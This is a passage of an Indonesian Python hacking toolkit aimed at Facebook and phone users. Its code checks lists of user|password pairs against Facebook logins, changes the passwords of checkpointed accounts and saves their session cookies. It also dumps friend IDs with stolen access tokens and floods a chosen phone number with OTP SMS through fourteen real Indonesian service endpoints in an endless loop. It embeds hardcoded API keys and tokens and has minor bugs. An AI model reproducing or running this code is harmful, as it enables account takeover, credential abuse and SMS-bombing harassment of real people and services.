		print ("\r    %s \033[0mcookie invalid"%(M))

import requests, shutil, os, re, bs4, sys, json, time, platform ,random, datetime, subprocess, logging, base64
import hmac, hashlib, urllib, stdiomask, urllib.request, uuid
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup as parser
from threading import (Thread, Event)
from time import sleep as jeda
from datetime import datetime

ct = datetime.now()
n = ct.month
bulan_ = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember']
try:
	if n < 0 or n > 12:
		exit()
	nTemp = n - 1
except ValueError:
	exit()

current = datetime.now()
hari = current.day
bulan = bulan_[nTemp]
tahun = current.year
bullan = current.month

waktu = ("%s-%s-%s"%(hari,bulan,tahun))
bulan12 = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}

M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
P = '\x1b[1;97m' # PUTIH
J = '\033[38;2;255;127;0;1m' # ORANGE
N = '\x1b[0m' # WARNA MATI
acak = [M, H, K, B, U, O, P, J]
warna = random.choice(acak)
til ="\033[0m╰─ "

def jalan(keliling):
	for mau in keliling + '\n':
		sys.stdout.write(mau)
		sys.stdout.flush();jeda(0.03)
		
		
ubah_pass = []
pwbaru = []
pwBaru = []
ubahP = []

def file_cp():
	dirs = os.listdir('CP')
	prints(nel(f'{P2}Tools Facebook Checker Account checkpoint V¹',width=80,padding=(0,7),style=f"{color_panel}")) 
	for file in dirs:
		print("➛ \033[0m%s"%(file));jeda(0.07)
	try:
		prints(nel(f'{P2}[+] Masukan file [ cth{M2}: {K2}CP-%s.txt{P2} ]'%(waktu),width=80,padding=(0,7),style=f"{color_panel}")) 
		opsi()
	except IOError:
		print ('%s[+]\033[0mfile tidak ada'%(M))
		exit()

def opsi():
	CP = ("CP/")
	romi = input("[+]%s \033[0mNama file %s> %s"%(O,M,K))
	if romi == "":
		print("[+]%s \033[0misi yang benar "%(M));jeda(2)
		opsi()
	try:
		file_cp = open(CP+romi, "r").readlines()
	except IOError:
		exit("\n[+]%s \033[0mnama file %s\033[0m tidak tersedia"%(M,romi))
	jalan("\033[0m[+]%s\033[0m Mode pesawatkan terlebih dahulu 5 detik "%(O))
	pw=input("\n[+]%s \033[0mubah sandi pada akun one tab? y/t %s> %s"%(O,M,K))
	if pw in['y','Y']:
		ubah_pass.append("ubah_sandi")
		pw2 = input("[+]%s \033[0mmasukan sandi %s> %s"%(O,M,K))
		if len(pw2) <= 5:
			print("[+] %ssandi minimal 6 karakter "%(M))
		else:
			pwbaru.append(pw2)
	print("\n %s# %s---------------------------------------- %s#"%(P,M,P));jeda(2)
	print ("[+]%s\033[0m total akun %s: %s%s "%(O,M,K,str(len(file_cp))))
	print(" %s# %s---------------------------------------- %s#"%(P,M,P));jeda(2)
	nomor = 0
	for fb in file_cp:
		akun = fb.replace("\n","")
		ngecek  = akun.split("|")
		nomor+=1
		print("\n%s%s.%s \033[0mlogin akun %s> %s%s"%(H,str(nomor),O,M,K,akun.replace(" *--> ","")));jeda(0.07)
		try:
			mengecek(ngecek[0].replace("",""), ngecek[1])
		except requests.exceptions.ConnectionError:
			continue
	print("\n[+]%s \033[0mSelesai mengecek akun"%(O));jeda(0.07)
	input('[+]%s [%s Enter%s ] '%(O,U,O))
	back()
	
data = {}
data2 = {}

def mengecek(user,pw):
	global loop,ubah_pass,pwbaru
	session=requests.Session()
	ua = 'Mozilla/5.0 (Linux; Android 8.1.0; S45B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36'
	url = "https://mbasic.facebook.com"
	session.headers.update({"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
	soup=bs4.BeautifulSoup(session.get(url+"/login/?next&ref=dbl&fl&refid=8").text,"html.parser")
	link=soup.find("form",{"method":"post"})
	for x in soup("input"):
		data.update({x.get("name"):x.get("value")})
	data.update({"email":user,"pass":pw})
	urlPost=session.post(url+link.get("action"),data=data)
	response=bs4.BeautifulSoup(urlPost.text, "html.parser")
	if "c_user" in session.cookies.get_dict():
		if "Akun Anda Dikunci" in urlPost.text:
			print("\r%s%s\033[0m akun terkunci sesi new"%(M,til))
		else:
			print("\r%s%s\033[0m akun tidak checkpoint, silahkan anda login "%(til,H))
			open('OK/OK-%s.txt'%(waktu), 'a').write(" %s|%s\n" % (user,pw))
	elif "checkpoint" in session.cookies.get_dict():
		coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
		title=re.findall("\<title>(.*?)<\/title>",str(response))
		link2=response.find("form",{"method":"post"})
		listInput=['fb_dtsg','jazoest','checkpoint_data','submit[Continue]','nh']
		for x in response("input"):
			if x.get("name") in listInput:
				data2.update({x.get("name"):x.get("value")})
		an=session.post(url+link2.get("action"),data=data2)
		response2=bs4.BeautifulSoup(an.text,"html.parser")
		cek=[cek.text for cek in response2.find_all("option")]
		number=0
		print("\r%s╰─%s \033[0mterdapat %s%s%s \033[0mopsi %s:"%(U,O,P,str(len(cek)),O,M));jeda(0.07)
		if(len(cek)==0):
			if "Lihat detail login yang ditampilkan. Ini Anda?" in title:
				if "ubah_sandi" in ubah_pass:
					dat,dat2={},{}
					but=["submit[Yes]","nh","fb_dtsg","jazoest","checkpoint_data"]
					for x in response("input"):
						if x.get("name") in but:
							dat.update({x.get("name"):x.get("value")})
					ubahPw=session.post(url+link2.get("action"),data=dat).text
					resUbah=bs4.BeautifulSoup(ubahPw,"html.parser")
					link3=resUbah.find("form",{"method":"post"})
					but2=["submit[Next]","nh","fb_dtsg","jazoest"]
					if "Buat Kata Sandi Baru" in re.findall("\<title>(.*?)<\/title>",str(ubahPw)):
						for b in resUbah("input"):
							dat2.update({b.get("name"):b.get("value")})
						dat2.update({"password_new":"".join(pwbaru)})
						an=session.post(url+link3.get("action"),data=dat2)
						coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
						print("\r%s%s\033[0makun one tab, sandi berhasil di ubah \n╰─ OK %s%s%s|%s|%s			"%(H,til,N,H,user,pwbaru[0],coki))
						open('OK/OK-%s.txt' %(waktu), 'a').write("%s%s|%s|%s\n" % (H,user,pwbaru[0],coki))
						#cek_apk(coki)
				else:
					print("\r%s%s \033[0makun one tab, silahkan anda login		"%(H,til))
					open('OK/OK-%s.txt' %(waktu), 'a').write("%s %s|%s|%s\n" % (H,user,pw,coki))
					#cek_apk(coki)
			elif "Masukkan Kode Masuk untuk Melanjutkan" in re.findall("\<title>(.*?)<\/title>",str(response)):
				print("\r%s╰─\033[0m akun terpasang autentikasi dua faktor			"%(M))
			else:
				print("%s%s\033[0mterjadi kesalahan"%(M,til))
		else:
			if "c_user" in session.cookies.get_dict():
				print("\r%s%s akun tidak checkpoint, silahkan anda login "%(H))
				open('OK/OK-%s.txt' %(waktu), 'a').write("%s%s|%s\n" % (H,user,pw))
		for opsi in range(len(cek)):
			number +=1
			jalan ("  %s%s. %s%s"%(P,str(number),K,cek[opsi]))
	elif "login_error" in str(response):
		oh = run.find("div",{"id":"login_error"}).find("div").text
		print("%s╰─ %s"%(M,oh))
	else:
		print("%s╰─ \033[0mlogin gagal, silahkan cek kembali id dan kata sandi"%(M))
		  
def scarpping_ua():
    # Url & Headers website #
    
    
    url = "https://api.apilayer.com/user_agent/generate?android=true&chrome=true"
    header = {"apikey": "2ZxXnjQByF6rPu3GM5DtcEmrJfKqB5xL"}
    
    # Main menu #
    
  #  os.system('clear')
    try:
        response = requests.get(url,headers=header)
        if response.status_code == 200:
            uascrap.append(response.json()['ua'])
        else:
            uascrap.append("Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-G900F Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36")
    except requests.exceptions.ConnectionError:
        uascrap.append("Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-G900F Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36")
        
###----------[ AUTHOR ]---------- ###
Author = 'Dapunta Khurayra X'
Version = 0.1
Facebook = 'Facebook.com/Dapunta.Khurayra.X'
Instagram = 'Instagram.com/ratya.anonym.id'

# --> Modules
import requests,bs4,sys,os,datetime,re
from bs4 import BeautifulSoup as bs
from datetime import datetime
from itertools import count 
from requests import get 
from bs4 import BeautifulSoup 
from rich import print as cetak
from rich import print as prints
from rich.panel import Panel as nel
done = False 
results = [] 
# -->  Clear Terminal
def clear():
    if "linux" in sys.platform.lower():os.system("clear")
    elif "win" in sys.platform.lower():os.system("cls")

# --> Waktu
def start():
    global Mulai_Jalan
    Mulai_Jalan = datetime.now()
def akhir():
    global Akhir_Jalan, Total_Waktu
    Akhir_Jalan = datetime.now()
    Total_Waktu = Akhir_Jalan - Mulai_Jalan
    try:
        Menit = str(Total_Waktu).split(':')[1]
        Detik = str(Total_Waktu).split(':')[2].replace('.',',').split(',')[0] + ',' + str(Total_Waktu).split(':')[2].replace('.',',').split(',')[1][:1]
        prints(nel(f'{P2}Program Selesai Dalam Waktu %s Menit %s Detik{P2}'%(Menit,Detik),width=80,padding=(0,7),style=f"{color_panel}")) 
    except Exception as e:
    	prints(nel(f'{P2}Program Selesai Dalam Waktu 0 Detik{P2}',width=80,padding=(0,7),style=f"{color_panel}")) 

# --> Main Program
class get_data_web:
    
    def __init__(self):
        self.xyz = requests.Session()
        url = input('[+] Url Anda : ')
        prints(nel(f'{P2}[{color_text}1{P2}]. Source Payload\n[{color_text}2{P2}]. Parsed Payload\n[{color_text}3{P2}]. Source Code Post Requests{P2}',width=80,padding=(0,7),style=f"{color_panel}")) 
        self.tanya = input('[+] Pilih : ')
        self.domain = url.split('/')[2]
        self.get_form(url)

    def get_form(self,url):
        req = self.xyz.get(url)
        raq = bs(req.content,'html.parser')
        for x in raq.find_all('form'):
            if self.tanya in ['1','01','a']: self.printing1(req,x)
            elif self.tanya in ['2','02','b']: self.printing2(req,x)
            elif self.tanya in ['3','03','c']: self.printing3(url,req,x)
            else: exit('\nIsi  Yg Benar!')

    def get_head1(self,req):
        data = {}
        head = req.headers
        usls = ['cookie','set-cookie','report-to','expires','x-fb-debug','date','last-modified','etag']
        for x,y in zip(head.keys(),head.values()):
            try:
                if x.lower() in usls: continue
                else: data.update({x:y})
            except Exception as e:continue
        return(data)

    def get_data1(self,form):
        data = {}
        for y in form.find_all('input'):
            try:data.update({y['name']:y['value']})
            except Exception as e:continue
        return(data)

    def get_data2(self,form):
        data = []
        for y in form.find_all('input'):
            try:data.append(y)
            except Exception as e:continue
        return(data)

    def get_post1(self,form):
        z = form['action']
        if 'https://'+self.domain in z: return(z)
        elif 'http://'+self.domain in z: return(z)
        else: return('https://%s%s'%(self.domain,z))

    def printing1(self,req,x):
        head = self.get_head1(req)
        data = self.get_data1(x)
        post = self.get_post1(x)
        coki = self.xyz.cookies.get_dict()
        prints(nel(f'{P2}Souce Payload{P2}',width=80,padding=(0,7),style=f"{color_panel}")) 
        print('[Host] %s'%(self.domain))
        print('[Head] %s'%(head))
        print('[Data] %s'%(data))
        print('[Coki] %s'%(coki))
        print('[Post] %s'%(post))

    def printing2(self,req,x):
        head = self.get_head1(req)
        data = self.get_data2(x)
        post = self.get_post1(x)
        coki = self.xyz.cookies.get_dict()
        prints(nel(f'{P2}Parsed Payload{P2}',width=80,padding=(0,7),style=f"{color_panel}")) 
        # --> Tampil Headers
        print('head = {')
        for x,y in zip(head.keys(),head.values()):
            print('    %s%s: %s'%(x,' '*(29-len(x)),y))
        print('    }')
        # --> Tampil Data
        print('data = {')
        for x in data:
            try:
                if 'value' in str(x):
                    dp = 'name=' + re.search('name=(.*?)/>',str(x)).group(1)
                    fp = re.search('value="(.*?)"',str(dp)).group(1)
                    print("    %s%s: '%s',"%(x['name'],' '*(19-len(x['name'])),fp))
                elif 'name' in str(x):
                    print("    %s%s: '',"%(x['name'],' '*(19-len(x['name']))))
                else: continue
            except Exception as e: continue
        print('    }')
        # --> Tampil Cookie
        print('cookie = {')
        for x,y in zip(coki.keys(),coki.values()):
            print('    %s%s: %s'%(x,' '*(5-len(x)),y))
        print('    }')
        # --> Post Requests
        print("next = '%s'"%(post))
        print("post = requests.Session().post(next,headers=head,data=data,cookies=cookie)")
    def printing3(self,url,req,x):
        head = self.get_head1(req)
        data = self.get_data2(x)
        post = self.get_post1(x)
        prints(nel(f'{P2}Souce Code Post Request{P2}',width=80,padding=(0,7),style=f"{color_panel}")) 
        # --> Tampil Get Requests
        print("url  = '%s'"%(url))
        print("requ = bs(requests.Session().get(url).content,'html.parser')")
        # --> Tampil Headers
        print('head = {')
        for x,y in zip(head.keys(),head.values()):
            print('    %s%s: %s'%(x,' '*(29-len(x)),y))
        print('    }')
        # --> Tampil Data
        print('data = {')
        for x in data:
            try:
                if 'value' in str(x):
                    dp = 'name=' + re.search('name=(.*?)/>',str(x)).group(1)
                    fp = re.search('value="(.*?)"',str(dp)).group(1)
                    gp = dp.replace(fp,'(.*?)')
                    rs = ("re.search('%s',str(requ)).group(1)"%(gp))
                    print('    %s%s: %s,'%(x['name'],' '*(19-len(x['name'])),rs))
                elif 'name' in str(x):
                    print("    %s%s: '',"%(x['name'],' '*(19-len(x['name']))))
                else: continue
            except Exception as e: continue
        print('    }')
        # --> Tampil Cookie
        print("cookie = requests.Session().cookies.get_dict()")
        # --> Post Requests
        print("next = '%s'"%(post))
        print("post = requests.Session().post(next,headers=head,data=data,cookies=cookie)")

#----------[BUAT DUMP ID SAMA]----------#
import os, re, requests, random, json, time, sys
from time import sleep

class Asepitgans_Xc:
	def __init__(self):
		self.id = []
		self.loop = 0
		try:
			self.cookie = open(".cok.txt","r").read()
			self.token = open(".token.txt","r").read()
			try:
				url = requests.get("https://graph.facebook.com/me?fields=id,name&access_token="+self.token,cookies={"cookie":self.cookie})
				nm_ = json.loads(url.text)["name"]
				id_ = json.loads(url.text)["id"]
				self.menu(id_,nm_,)
			except KeyError:
				Asepitgans_Xc()
			except requests.exceptions.ConnectionError:
				prints(nel(f'{P2}Koneksi jaringan tidak stabil{P2}',width=80,padding=(0,7),style=f"{color_panel}"));exit()
		except FileNotFoundError:
			Asepitgans_Xc()
	def menu(self, idku, nmku):
		prints(nel(f'{P2} Hallo welcome {H2}{nmku}{P2} monyet{P2}',width=80,padding=(0,7),style=f"{color_panel}"))
		teks = f'''[•] Masukan id : '''
		user = input(teks)
		try:
			header = {"User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0"}
			req = requests.get("https://graph.facebook.com/v15.0/"+user+"?fields=friends.limit(5000){id,name}&access_token="+self.token,cookies={"cookie": self.cookie},headers=header).json()
			for res in req['friends']['data']:
				try:self.id.append(res['id'])
				except:continue
			self.tanya()
		except (KeyError,IOError):
			prints(nel(f'{P2}ID anda sepertinya tidak publik{P2}',width=80,padding=(0,7),style=f"{color_panel}"))
	def tanya(self):
		prints(nel(f'''{P2}[{color_text}1{P2}]. 10001      [{color_text}6{P2}]. 10006
[{color_text}2{P2}]. 10002      [{color_text}7{P2}]. 10007
[{color_text}3{P2}]. 10003      [{color_text}8{P2}]. 10008
[{color_text}4{P2}]. 10004      [{color_text}9{P2}]. 10009
[{color_text}5{P2}]. 10005      [{color_text}0{P2}]. 10000{P2}''',width=80,padding=(0,7),style=f"{color_panel}")) 
		pilih = input('[•] Pilih : ')
		if pilih =='1':self.dump_lagi('1')
		if pilih =='2':self.dump_lagi('2')
		if pilih =='3':self.dump_lagi('3')
		if pilih =='4':self.dump_lagi('4')
		if pilih =='5':self.dump_lagi('5')
		if pilih =='6':self.dump_lagi('6')
		if pilih =='7':self.dump_lagi('7')
		if pilih =='8':self.dump_lagi('8')
		if pilih =='9':self.dump_lagi('9')
		if pilih =='0':self.dump_lagi('0')
	def dump_lagi(self,target):
		prints(nel(f'{P2}Hasil dump tersimpan di: /sdcard/dump/1000{target}.txt\nKlik ctrl z untuk berhenti dump{P2}',width=80,padding=(0,7),style=f"{color_panel}"))
		for user in self.id:
			try:
				header = {"User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0"}
				req = requests.get("https://graph.facebook.com/v15.0/"+user+"?fields=friends.limit(5000){id,name}&access_token="+self.token,cookies={"cookie": self.cookie},headers=header).json()
				for res in req['friends']['data']:
					sys.stdout.write(f'\r[•] Mengumpulkan id: {self.loop}')
					try:
						inpo = res['id']
						if inpo[0:5] == f'1000{target}':
							open(f'/sdcard/dump/1000{target}.txt','a').write(res['id']+'|'+res['name']+'\n')
							self.loop+=1
						else:continue

					except:
						continue
			except (KeyError,IOError,AttributeError):continue

#---------[USER AGENT MEMEK]----------#
agent = random.choice(
			[
				"Mozilla/5.0 (Linux; Android 6.0.1; SM-J500M Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36",
				"Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-G900F Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36",
				"Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.111 Mobile Safari/537.36",
				"Dalvik/1.6.0 (Linux; U; Android 4.1.1; BroadSign Xpress 1.0.14 B- (720) Build/JRO03H)",
				"Mozilla/5.0 (Linux; U; Android 4.1.1; en-us; BroadSign Xpress 1.0.15-6 B- (720) Build/JRO03H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30","Mozilla/5.0 (Linux; Android 5.1.1; A37fw Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36",
				"Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.111 Mobile Safari/537.36"
				"Mozilla/5.0 (Linux; Android 10; SM-A305F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Mobile Safari/537.36"
		]
	)

#----------[BAUT SPAM SMS]----------#
def process_data1():
	sleep(0.10)
	
def spam_sms():
	global nomor 
	prints(nel(f'{P2}Contoh : {H2}+6281234567xxx{P2}',width=80,padding=(0,7),style=f"{color_panel}")) 
	nomor = input(f"[+] input no hp :\033[32m +62").replace("+62","")
	if nomor == "":
		pass
	else:
		while True:
			for _ in track(range(100), description=f'{P2}tunggu sedang spam sms...'):process_data1()
			sxp_sms()

class sxp_sms:

	def __init__(self):
		self.req = requests.Session()
		self.main()

	def sms_otp_1(self, no):
		__req__ = self.req.post("https://service.mokapos.com/account/v1/verification/phone/send",
			headers = {
				  "accept": "application/json, text/plain, */*",
				  "authorization": "undefined",
				  "save-data": "on",
				  "user-agent": agent,
				  "content-type": "application/json;charset=UTF-8"
				},
			json = {
				 "phone_number": f"+62{no}"
			  }
		).text

	def sms_otp_2(self, no):
		data = json.dumps({
					"mobile": f"0{no}",
					"noise": "1583590641573155574",
					"request_time": "158359064157312",
					"access_token": "11111"
				   })
		__req__ = self.req.post("https://apiservice.rupiahcepatweb.com/webapi/v1/request_login_register_auth_code",
			headers = {
				    "accept": "text/html, application/xhtml+xml, application/json, */*",
				    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
				    "content-length": "166",
				    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
				    "origin": "https://h5.rupiahcepatweb.com",
				    "referer": "https://h5.rupiahcepatweb.com/dua2/pages/openPacket/openPacket.html?activityId=11&invite=200219190100215723",
				    "sec-fetch-dest": "empty",
				    "sec-fetch-mode": "cors",
				    "sec-fetch-site": "same-site",
				    "user-agent": agent
				  },
			data = {
				 "data": data
			   }
		).text

	def sms_otp_3(self, no):
		__req__ = self.req.post("https://www.olx.co.id/api/auth/authenticate",
			headers = {
				    "accept": "*/*",
				    "x-newrelic-id": "VQMGU1ZVDxABU1lbBgMDUlI=",
				    "x-panamera-fingerprint": "83b09e49653c37fb4dc38423d82d74d7#1597271158063",
				    "user-agent": agent,
				    "content-type": "application/json"
				  },
			json = {
				 "grantType": "retry",
				 "method": "sms",
				 "phone": no,
				 "language": "id"
				}
		).text

	def sms_otp_4(self, no):
		__req__ = self.req.post("https://www.alodokter.com/login-with-phone-number",
			headers = {
				    "user-agent": agent,
				    "content-type": "application/json",
				    "referer": "https://www.alodokter.com/login-alodokter",
				    "accept": "application/json",
				    "origin": "https://www.alodokter.com"
				  },
			json = {
				 "user":{
					  "phone": f"0{no}"
					}
				}
		).text

	def sms_otp_5(self, no):
		__req__ = self.req.post("https://www.kelaspintar.id/user/otpverification",
			headers = {
				    "x-requested-with": "XMLHttpRequest",
				    "User-Agent": agent,
				    "Referer": "https://www.kelaspintar.id/"
				  },
			data = {
				 "user_mobile": no,
				 "otp_type": "send_otp_reg",
				 "mobile_code": "%2B62"
				}
		).text

	def sms_otp_6(self, no):
		aink_sanz = random.choice(
						[
							"Hallo Mantan",
							"Hallo Bangsad",
							"Hallo Sayang",
							"Hallo Ripper",
							"Hallo Ngab"
						]
					)
		email = random.choice(
					[
						"nsnsmsmksksmsm@gmail.com",
						"lavon.lockman@gmail.com",
						"duane_mclaughlin38@gmail.com",
						"alfreda.lindgren@gmail.com",
						"leonardo_kuhlman@gmail.com",
						"lyric51@gmail.com",
						"devonte_littel@gmail.com",
						"newell.kuhic@gmail.com"
					]
				)
		pw = random.choice(
					[
						"mamsmms123",
						"Wadepak1037",
						"waifugw1011"
					]
				)
		birth_date = random.choice(
						[
							"13/09/1999",
							"04/02/2022",
							"05/02/2022",
							"05/02/2022",
							"06/02/2022",
							"10/02/2022"
						]
	)
		__req__ = self.req.post("https://www.matahari.com/rest/V1/thorCustomers",
			json = {
				"thor_customer":{
						"name": aink_sanz,
						"card_number": None,
						"email_address": email,
						"mobile_country_code": "+62",
						"gender_id": "1",
						"mobile_number": f"0{no}",
						"mro": "",
						"password": pw,
						"birth_date": birth_date
						}
				},
			headers = {
					"Host": "www.matahari.com",
					"x-newrelic-id": "Vg4GVFVXDxAGVVlVBgcGVlY=",
					"origin": "https://www.matahari.com",
					"user-agent": agent,
					"content-type": "application/json",
					"accept": "*/*",
					"x-requested-with": "XMLHttpRequest",
					"referer": "https://www.matahari.com/customer/account/create/",
					"accept-encoding": "gzip, deflate, br",
					"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
				}

		).text

	def sms_otp_7(self, no):
		__req__ = self.req.post("https://api.duniagames.co.id/api/user/api/v2/user/send-otp",
			headers = {
				    "Host": "api.duniagames.co.id",
				    "content-length": "32",
				    "accept": "application/json, text/plain, */*",
				    "x-device": "cc45ed83-73bd-4a98-83e3-874e8bc11a7f",
				    "accept-language": "id",
				    "user-agent": agent,
				    "ciam-type": "FR",
				    "content-type": "application/json",
				    "origin": "https://duniagames.co.id",
				    "sec-fetch-site": "same-site",
				    "sec-fetch-mode": "cors",
				    "sec-fetch-dest": "empty",
				    "referer": "https://duniagames.co.id/",
				    "accept-encoding": "gzip, deflate, br"
				  },
			json = {
				 "phoneNumber": f"+62{no}"
				}
		).text

	def sms_otp_8(self, no):
		__req__ = self.req.post("https://harvestcakes.com/register",
			headers = {
				    "User-Agent": agent,
				    "Referer": "https://harvestcakes.com/register"
				  },
			data = {
				 "phone": f"0{no}",
				 "url": ""
				}
		).text

	def sms_otp_9(self, no):
		__req__ = self.req.post("https://identity-gateway.oyorooms.com/identity/api/v1/otp/generate_by_phone?locale=id",
			headers = {
				    "Host": "identity-gateway.oyorooms.com",
				    "consumer_host": "https://www.oyorooms.com",
				    "accept-language": "id",
				    "access_token": "SFI4TER1WVRTakRUenYtalpLb0w6VnhrNGVLUVlBTE5TcUFVZFpBSnc=",
				    "User-Agent": agent,
				    "Content-Type": "application/json",
				    "accept": "*/*",
				    "origin": "https://www.oyorooms.com",
				    "referer": "https://www.oyorooms.com/login",
				    "Accept-Encoding": "gzip, deflate, br"
				  },
			json = {
				 "phone": f"0{no}",
				 "country_code": "+62",
				 "country_iso_code": "ID",
				 "nod": "4",
				 "send_otp": "true",
				 "devise_role": "Consumer_Guest"
				}
		).text

	def sms_otp_10(self, no):
		__req__ = self.req.post("https://crp-app.stamps.co.id/api/auth/validate-mobile-number",
			json = {
				"mobile_number": f"0{no}",
				"token": "sI01tF5bOSYHabS7HaXiB1k3j0JxFxbcQ79Rd1HFBjKEKJqYAwSNMScsx9AEZq3O"
				},
			headers = {
					"Host": "crp-app.stamps.co.id",
					"content-type": "application/json; charset=utf-8",
					"content-length": "106",
					"accept-encoding": "gzip",
					"User-Agent": agent
			}
		).text

	def sms_otp_11(self, no):
		__req__ = self.req.post("https://app-api.kredito.id/client/v1/common/verify-code/send",
			headers = {
				    "LPR-TIMESTAMP": "1603281035821",
				    "Accept-Language": "id-ID",
				    "LPR-BRAND": "Kredito",
				    "LPR-PLATFORM": "android",
				    "User-Agent": agent,
				    "Authorization": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1aWQiOi0xNjAzMjgxMDE3MjAzLCJ1dHlwZSI6ImFub24iLCJleHAiOjE2MDMyODQ2MTd9._HUnW7FQmMiDWvSejS0MBqMq95l2rk_6PuxDeXY5Oks",
				    "LPR-SIGNATURE": "e15dbea8602409df32a2ed5a123dc244",
				    "Content-Type": "application/json; charset=UTF-8",
				    "Content-Length": "79"
				   },
			data = '{"event":"default_verification","mobilePhone":"%s","sender":"jatissms"}' % no
		).text

	def sms_otp_12(self, no):
		__req__ = self.req.post("https://www.autofun.co.id:443/v2/captcha/sms",
			headers = {
					"Host": "www.autofun.co.id",
					"Connection": "keep-alive",
					"Content-length": "84",
					"accept": "*/*",
					"User-Agent": agent,
					"Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
					"content-type": "application/json;charset=UTF-8",
					"Origin": "https://www.autofun.co.id",
					"X-Requested-With": "acr.browser.barebones",
					"Sec-Fetch-Site": "same-origin",
					"Sec-Fetch-Mode": "cors",
					"Sec-Fetch-Dest": "empty",
					"Referer": "https://www.autofun.co.id/mobil/datsun",
					"Accept-Encoding": "gzip, deflate"
				},
			json = {
					"phoneNum": f"62{no}",
					"languageCode": "id-id",
					"countryCode": "id",
					"platform": 2
			}
		).text

	def sms_otp_13(self, no):
		__req__ = self.req.post("https://api.myfave.com/api/fave/v3/auth",
			json = {
					"phone":"+62"+no
				},
			headers = {
					"Host": "api.myfave.com",
					"Connection": "keep-alive",
					"x-user-agent": "Fave-PWA/v1.0.0",
					"Origin": "https://m.myfave.com",
					"User-Agent": agent,
					"content-type": "application/json",
					"Accept": "*/*",
					"Referer": "https://m.myfave.com/jakarta/auth",
					"Accept-Encoding": "gzip, deflate, br",
					"Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
			}
		).text

	def sms_otp_14(self, no):
		nickname = random.choice(
					  [
					    "fahmi",
					    "xzc0der",
					    "bed3bah",
					    "xmanz"
					  ]
					)
		angka = random.randint(
					111,
					999
				      )
		__req__ = self.req.post("https://wong.kitabisa.com/register/draft",
			headers = {
				    "Host": "wong.kitabisa.com",
				    "x-ktbs-platform-name": "pwa",
				    "origin": "https://account.kitabisa.com",
				    "x-ktbs-time": "1611020248",
				    "user-agent": agent,
				    "x-ktbs-api-version": "1.0.0",
				    "accept": "application/json",
				    "x-ktbs-client-name": "kanvas",
				    "x-ktbs-request-id": "107790c3-86e0-4872-9dfb-b9c5da9bfa13",
				    "x-ktbs-client-version": "1.0.0",
				    "x-ktbs-signature": "e6b4dd627125b3ccd53de193d165c481cc7fdfef0b1dcd7a587636a008fdc89e",
				    "version": "3.4.0",
				    "referer": "https://account.kitabisa.com/register/otp?type=sms",
				    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
				  },
			json = {
				 "full_name": nickname+str(angka),
				 "username": f"62{no}",
				 "otp_type": "sms"
				}
		).text

	def main(self):
		self.sms_otp_1(nomor)
		self.sms_otp_2(nomor)
		self.sms_otp_3(nomor)
		self.sms_otp_4(nomor)
		self.sms_otp_5(nomor)
		self.sms_otp_6(nomor)
		self.sms_otp_7(nomor)
		self.sms_otp_8(nomor)
		self.sms_otp_9(nomor)
		self.sms_otp_10(nomor)
		self.sms_otp_11(nomor)
		self.sms_otp_12(nomor)
		self.sms_otp_13(nomor)
		self.sms_otp_14(nomor)
		prints(nel(f'{P2}Sukses spam SMS ke no : {K2}+62{nomor}{P2}',width=80,padding=(0,7),style=f"{color_panel}")) 
		
#-----------[BUAT SPAM WHATSAPP]---------#
def spam_wa():
	global nomor
